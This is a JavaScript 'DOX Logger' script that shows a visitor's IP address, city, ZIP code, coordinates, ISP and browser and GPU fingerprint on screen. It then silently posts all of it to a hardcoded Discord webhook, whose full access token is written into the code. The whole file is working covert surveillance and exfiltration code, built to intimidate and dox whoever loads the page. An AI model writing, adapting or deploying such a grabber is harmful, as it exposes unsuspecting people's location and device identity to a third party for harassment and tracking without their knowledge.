async function startDox() {
    console.log("Starting DOX...");
    
    let doxElement = document.getElementById("dox");
    let doxBgVideo = document.getElementById("dox-bg-vid");
    let doxOverlay = document.getElementById("dox-overlay");

    doxBgVideo?.play();
    doxElement.style.opacity = '1';

    let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
    doxOverlay.style.fontSize = fontSize + 'px';

    const collectedData = {};

    async function displayInfo(label, value) {
        let span = document.createElement("span");
        span.innerText = `${label}: ${value}`;
        doxOverlay.appendChild(span);

        collectedData[label] = value;

        const overlayHeight = doxOverlay.getBoundingClientRect().height;
        if (overlayHeight > window.innerHeight) {
            fontSize = fontSize - fontSize / 10;
            doxOverlay.style.fontSize = fontSize + 'px';
        }

        await new Promise((res) => setTimeout(res, 300));
    }

    async function fetchAndDisplayIPData() {
        try {
            const ipData = await (await fetch("https://wtfismyip.com/json")).json();
            const locationData = await (await fetch(`https://we-are-jammin.xyz/json/${ipData.YourFuckingIPAddress}`)).json();
            const browserData = new BrowserDetector(window.navigator.userAgent).parseUserAgent();

            await displayInfo("IP Address", ipData.YourFuckingIPAddress);
            await displayInfo("Country", locationData.country);
            await displayInfo("Region", locationData.regionName);
            await displayInfo("City", locationData.city);
            await displayInfo("ZIP Code", locationData.zip);
            await displayInfo("Location", ipData.YourFuckingLocation);
            await displayInfo("Latitude", locationData.lat);
            await displayInfo("Longitude", locationData.lon);
            await displayInfo("Timezone", locationData.timezone);
            await displayInfo("Current Time", new Date().toLocaleString());
            await displayInfo("ISP", locationData.isp);
            await displayInfo("Organization", locationData.org);
            await displayInfo("Autonomous System", locationData.as);
            await displayInfo("Browser", browserData.name + " " + browserData.version);
            await displayInfo("Platform", browserData.platform);
            await displayInfo("Mobile/Tablet", browserData.isMobile || browserData.isTablet ? "Yes" : "No");
            await displayInfo("Referrer", document.referrer || "None");
            await displayInfo("Languages", navigator.languages.join(", "));
            await displayInfo("Screen", `${screen.width}x${screen.height}`);
            await displayInfo("Pixel Depth", screen.pixelDepth);

            if (typeof screen.orientation !== "undefined") {
                await displayInfo("Orientation", screen.orientation.type);
                await displayInfo("Rotation", screen.orientation.angle + "°");
            }

            await displayInfo("CPU Threads", navigator.hardwareConcurrency);

            if (window.performance?.memory) {
                await displayInfo("Memory Limit", Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) + " MB");
            }

            // GPU Info
            const canvas = document.createElement("canvas");
            let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            let debugInfo = gl?.getExtension("WEBGL_debug_renderer_info");
            if (gl && debugInfo) {
                await displayInfo("GPU Vendor", gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
                await displayInfo("GPU Renderer", gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
            }

            // ✅ Send to Discord after everything collected
            sendToDiscordWebhook(collectedData);
        } catch (err) {
            console.error("Error collecting data:", err);
        }
    }

    await fetchAndDisplayIPData();
}

// Sends the data to a Discord webhook as a detailed embed
function sendToDiscordWebhook(collectedData) {
    const webhookUrl = "https://discord.com/api/webhooks/1402845085288366261/FummiU0Zb1bHBQC6qhMyTOx-ba990D6lSEnBmegUzkIH_kj-n3doBp7C6eFJtHBkJaxh";

    const embed = {
        title: "🛰️ New Client Information Logged",
        color: 0x7289da,
        fields: Object.entries(collectedData).map(([key, value]) => ({
            name: key,
            value: String(value || "N/A").slice(0, 1024), // prevent overflow
            inline: false
        })),
        timestamp: new Date().toISOString(),
        footer: {
            text: "DOX Logger"
        }
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ embeds: [embed] })
    }).then(() => {
        console.log("✅ Info sent to Discord webhook.");
    }).catch((err) => {
        console.error("❌ Failed to send to Discord:", err);
    });
}